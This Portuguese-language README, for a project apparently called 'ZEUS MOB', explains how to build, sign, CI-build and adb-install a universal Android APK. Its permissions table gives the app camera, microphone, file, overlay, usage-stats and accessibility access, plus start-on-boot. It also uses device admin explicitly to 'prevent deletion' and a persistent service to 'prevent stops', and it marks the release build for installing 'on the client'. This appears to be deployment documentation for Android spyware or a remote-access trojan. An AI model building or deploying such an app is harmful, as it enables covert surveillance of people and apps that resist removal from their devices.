# ZEUS MOB — Android APK Builder

Projeto Android nativo pronto para gerar APK universal (ARM64 + ARMv7) para Android 10+.

## Configuração

| Parâmetro | Valor |
|-----------|-------|
| `minSdkVersion` | 24 (Android 7.0) |
| `targetSdkVersion` | 34 (Android 14) |
| `compileSdkVersion` | 34 |
| `ABI` | arm64-v8a + armeabi-v7a (universal) |
| `Java` | 17 |
| `Gradle` | 8.4 |
| `AGP` | 8.2.2 |

## Requisitos

- **OpenJDK 17** — [Baixar](https://adoptium.net/)
- **Android SDK** (via Android Studio ou command-line tools)
- `ANDROID_HOME` configurado no ambiente

## Setup rápido (Linux/macOS)

```bash
chmod +x setup-android-sdk.sh build-apk.sh
./setup-android-sdk.sh   # Instala JDK 17 + Android SDK automaticamente
```

## Gerar APK

```bash
# Build completo (Debug + Release)
./build-apk.sh

# Apenas Release
./gradlew assembleRelease

# Apenas Debug
./gradlew assembleDebug
```

APKs salvos em:
```
app/build/outputs/apk/
├── release/  ZeusMob-1.0.0-release-universal.apk  ← instalar no cliente
└── debug/    ZeusMob-1.0.0-DEBUG-debug-universal.apk ← para testes
```

## Instalar no dispositivo (ADB)

```bash
adb install -r app/build/outputs/apk/release/ZeusMob-1.0.0-release-universal.apk
```

## Permissões configuradas

| Permissão | Uso |
|-----------|-----|
| `INTERNET` | Conexão com servidores |
| `CAMERA` | Acesso à câmera |
| `RECORD_AUDIO` | Acesso ao microfone |
| `READ_MEDIA_*` | Acesso a arquivos |
| `SYSTEM_ALERT_WINDOW` | Draw over apps |
| `PACKAGE_USAGE_STATS` | App usage stats |
| `WAKE_LOCK` | Prevenir modo sono |
| `RECEIVE_BOOT_COMPLETED` | Iniciar com o sistema |
| `BIND_ACCESSIBILITY_SERVICE` | Accessibility service |
| `BIND_DEVICE_ADMIN` | Prevenir exclusão |
| `FOREGROUND_SERVICE` | Prevenir paradas (serviço persistente) |

## Assinatura Release com keystore próprio

```bash
export KEYSTORE_PATH=/caminho/para/meu.keystore
export KEYSTORE_PASSWORD=minha_senha
export KEY_ALIAS=meu_alias
export KEY_PASSWORD=minha_senha_chave

./gradlew assembleRelease
```

Sem essas variáveis, o release é assinado com o debug keystore (funciona para instalação direta, não para Play Store).

## GitHub Actions (CI/CD)

Para buildar automaticamente no GitHub, adicione `.github/workflows/build.yml`:

```yaml
name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
      - name: Build Release APK
        run: |
          cd android-apk-builder
          chmod +x gradlew
          ./gradlew assembleRelease
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: zeus-mob-apk
          path: android-apk-builder/app/build/outputs/apk/release/*.apk
```
